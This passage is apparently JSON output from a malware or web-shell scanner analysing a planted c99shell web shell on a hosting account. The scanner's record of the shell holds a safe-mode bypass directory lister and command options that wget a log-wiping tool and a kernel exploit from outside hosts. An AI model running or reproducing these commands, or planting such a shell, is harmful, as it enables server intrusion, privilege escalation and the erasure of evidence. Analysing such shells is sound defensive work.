            "   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">",
            "      <div align=\"center\"><br>",
            "      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>",
            "    </form></center>",
            "    </td>",
            "</tr></TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/home/chsclair/public_html/remote_assist/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/home/chsclair/public_html/remote_assist/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>",
            "</td>",
            "</tr>",
            "</TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0134 ]--</p></td></tr></table>",
            "<br/></body></html>"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
                "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
                "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)"
            ]
        },
        "ip": [],
        "url": [
            "http://ftp.powernet.com.tr/supermail/debug/k3",
            "http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c",
            "http://google.com/search"
        ]
    },
    "time": "0:00:01.631031",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
